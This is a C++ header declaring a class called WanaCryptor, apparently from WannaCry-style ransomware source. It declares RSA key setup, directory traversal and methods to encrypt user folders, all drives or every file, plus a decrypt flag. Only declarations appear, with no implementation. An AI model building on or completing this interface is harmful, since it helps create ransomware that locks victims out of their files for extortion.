#pragma once
#include <Windows.h>
#include "WanaZip.h"
#include "FileList.h"

class WanaCryptor
{
	PWanaZip m_pWanaZip;
	PFileList m_pFileList;
	ULONG m_TotalFile;
	LARGE_INTEGER m_TotalSize;

	BOOL SetupRSA(DWORD, PUCHAR, ULONG);
	BOOL InitWanaZip(DWORD);
	ULONG SelectEncryptAction(PFileInfo, ULONG);
	BOOL EncryptDispatch(PFileInfo, ULONG);
	BOOL EncryptTraverse(LPCTSTR);
	BOOL EncryptFileList();
public:
	WanaCryptor();
	WanaCryptor(PUCHAR pbPublicKey, ULONG cbPublicKey);
	~WanaCryptor();
	BOOL Encrypt(LPCTSTR);
	BOOL EncryptUsers();
	BOOL EncryptDrives();
	BOOL EncryptAll();
	ULONG GetTotalFile();
	BOOL GetTotalSize(PLARGE_INTEGER);
};

typedef WanaCryptor* PWanaCryptor;

BOOL SetDecryptFlag(BOOL);
BOOL GetDecryptFlag();